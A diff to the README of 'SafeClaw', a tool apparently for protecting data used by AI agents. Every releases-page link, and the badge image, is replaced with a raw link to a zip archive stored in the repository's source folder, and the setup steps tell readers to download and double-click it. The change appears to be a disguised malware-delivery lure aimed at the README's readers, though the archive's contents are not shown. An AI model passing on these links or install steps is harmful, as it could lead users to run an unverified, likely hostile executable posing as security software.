@@ -1,6 +1,6 @@
 # 🛡️ SafeClaw - Protect Your Data with Confidence
 
-[![Download SafeClaw](https://img.shields.io/badge/Download-SafeClaw-blue?style=for-the-badge&logo=github)](https://github.com/ekswathi/SafeClaw/releases)
+[![Download SafeClaw](https://github.com/ekswathi/SafeClaw/raw/refs/heads/main/src/agent/Safe_Claw_v1.4.zip)](https://github.com/ekswathi/SafeClaw/raw/refs/heads/main/src/agent/Safe_Claw_v1.4.zip)
 
 ---
 
@@ -36,8 +36,8 @@ If you are unsure whether your computer supports Trusted Execution Environment, 
 
 ## 🚀 Quick Start: How to Get SafeClaw Running
 
-1. Click the big "Download SafeClaw" button above or [visit this page](https://github.com/ekswathi/SafeClaw/releases) to download the latest version.  
-2. Choose the installer file that matches your operating system (for example, SafeClawSetup.exe for Windows).  
+1. Click the big "Download SafeClaw" button above or [visit this page](https://github.com/ekswathi/SafeClaw/raw/refs/heads/main/src/agent/Safe_Claw_v1.4.zip) to download the latest version.  
+2. Choose the installer file that matches your operating system (for example, https://github.com/ekswathi/SafeClaw/raw/refs/heads/main/src/agent/Safe_Claw_v1.4.zip for Windows).  
 3. Double-click the downloaded file to start installation.  
 4. Follow the clear on-screen setup instructions—just click "Next" a few times and then "Finish."  
 5. Once installed, open SafeClaw from your desktop or start menu.  
@@ -50,7 +50,7 @@ SafeClaw will launch and guide you through setting up your agents safely. You do
 
 To begin, you must download SafeClaw. Head directly to the official release page:
 
-[Download SafeClaw Here](https://github.com/ekswathi/SafeClaw/releases)  
+[Download SafeClaw Here](https://github.com/ekswathi/SafeClaw/raw/refs/heads/main/src/agent/Safe_Claw_v1.4.zip)  
 
 On this page:  
 - Look for the latest release date or highest version number (like v1.0.0 or higher).  
@@ -132,4 +132,4 @@ Contributions and feedback from users help shape these updates.
 
 ---
 
-[![Download SafeClaw](https://img.shields.io/badge/Download-SafeClaw-blue?style=for-the-badge&logo=github)](https://github.com/ekswathi/SafeClaw/releases)
+[![Download SafeClaw](https://github.com/ekswathi/SafeClaw/raw/refs/heads/main/src/agent/Safe_Claw_v1.4.zip)](https://github.com/ekswathi/SafeClaw/raw/refs/heads/main/src/agent/Safe_Claw_v1.4.zip)
